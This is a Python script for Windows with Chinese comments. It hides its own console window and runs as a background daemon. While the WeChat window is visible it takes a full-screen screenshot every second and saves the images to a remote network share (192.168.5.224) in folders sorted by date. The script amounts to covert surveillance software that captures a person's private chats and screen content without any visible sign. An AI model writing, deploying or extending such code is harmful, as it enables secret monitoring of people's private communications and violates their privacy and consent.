import os
import time
from datetime import datetime
from PIL import ImageGrab
import logging
import sys
import win32gui
import win32con
import psutil
import win32api

# ===== 配置部分 =====
SCREENSHOT_FOLDER = r"\\192.168.5.224\龙林网盘\19-教师空间\JT\rsh"  # 网络共享路径
ACTIVE_INTERVAL = 1  # 微信窗口活跃时的截图间隔(秒)
INACTIVE_INTERVAL = 3  # 微信窗口不活跃时的检查间隔(秒)
LOG_FILE = "screenshot_daemon.log"  # 日志文件路径
WECHAT_WINDOW_CLASS = "WeChatMainWndForPC"  # 微信主窗口类名


def resource_path(relative_path):
    """获取打包后的资源绝对路径"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


def setup_logging():
    """配置日志记录"""
    try:
        logging.basicConfig(
            filename=resource_path(LOG_FILE),
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        logging.info(" 截图服务启动")
    except Exception as e:
        print(f"无法设置日志: {str(e)}")
        sys.exit(1)


def get_screenshot_folder():
    """获取当前日期对应的截图文件夹路径"""
    now = datetime.now()
    day_folder = os.path.join(SCREENSHOT_FOLDER, now.strftime("%Y%m%d"))  # 格式: YYYYMMDD

    try:
        os.makedirs(day_folder, exist_ok=True)

        # 测试文件夹可写性
        test_file = os.path.join(day_folder, "test_permission.txt")
        with open(test_file, "w") as f:
            f.write("test")
        os.remove(test_file)

        logging.info(f" 截图保存位置: {day_folder}")
        return day_folder
    except Exception as e:
        logging.error(f" 无法创建或访问截图文件夹: {day_folder}\n错误: {str(e)}")
        print(f"无法访问截图保存路径: {str(e)}")
        return None


def is_wechat_active():
    """检查微信窗口是否处于活跃状态(可见且未最小化)"""
    try:
        def callback(hwnd, extra):
            if (win32gui.IsWindowVisible(hwnd) and
                    not win32gui.IsIconic(hwnd) and
                    win32gui.GetClassName(hwnd) == WECHAT_WINDOW_CLASS):
                # 检查窗口是否在屏幕可视区域内
                rect = win32gui.GetWindowRect(hwnd)
                screen_width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                screen_height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)

                # 判断窗口是否至少有一部分在屏幕内
                if (rect[2] > 0 and rect[3] > 0 and
                        rect[0] < screen_width and rect[1] < screen_height):
                    extra.append(hwnd)

        windows = []
        win32gui.EnumWindows(callback, windows)
        return len(windows) > 0
    except Exception as e:
        logging.error(f" 检测微信窗口状态时出错: {str(e)}")
        return False


def take_screenshot(folder_path, quality=85):
    """高质量截图并保存"""
    if folder_path is None:
        return

    try:
        timestamp = datetime.now().strftime("%H%M%S_%f")[:-3]  # 时间+毫秒
        filename = f"{timestamp}.jpg"
        filepath = os.path.join(folder_path, filename)

        img = ImageGrab.grab()
        img.save(filepath, "JPEG", quality=quality)
        logging.debug(f" 截图已保存: {filename}")
    except Exception as e:
        logging.error(f" 截图时出错: {str(e)}")


def daemon():
    """后台守护进程"""
    setup_logging()
    last_active_state = False
    screenshot_count = 0
    current_day_folder = None
    last_check_day = None

    try:
        import win32api
    except ImportError:
        logging.error(" 无法导入win32api，屏幕区域检测功能受限")
        print("警告: 屏幕区域检测功能受限")

    while True:
        try:
            # 检查日期是否变化
            now = datetime.now()
            if last_check_day != now.day:
                current_day_folder = get_screenshot_folder()
                last_check_day = now.day
                screenshot_count = 0  # 重置计数器

            current_active = is_wechat_active()

            if current_active:
                # 微信窗口活跃状态
                take_screenshot(current_day_folder)
                screenshot_count += 1

                # 每截图20次记录一次日志，避免日志过多
                if screenshot_count % 20 == 0:
                    logging.info(f" 微信窗口活跃中，已连续截图{screenshot_count}次")

                time.sleep(ACTIVE_INTERVAL)
            else:
                if last_active_state:
                    # 从活跃变为不活跃
                    logging.info(f" 微信窗口变为不活跃，停止实时截图。本次共截图{screenshot_count}次")
                    screenshot_count = 0

                time.sleep(INACTIVE_INTERVAL)

            last_active_state = current_active

        except KeyboardInterrupt:
            logging.info(" 用户中断，退出截图服务")
            sys.exit(0)
        except Exception as e:
            logging.error(f" 运行时错误: {str(e)}")
            time.sleep(5)


if __name__ == "__main__":
    try:
        from PIL import ImageGrab
        import win32gui, win32con, win32api
        import psutil
    except ImportError as e:
        print(f"需要安装以下库:\n"
              f"pip install Pillow pywin32 psutil\n"
              f"错误: {str(e)}")
        sys.exit(1)

        # 隐藏控制台窗口
    if os.name == 'nt':
        try:
            import ctypes

            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
        except:
            pass

    daemon()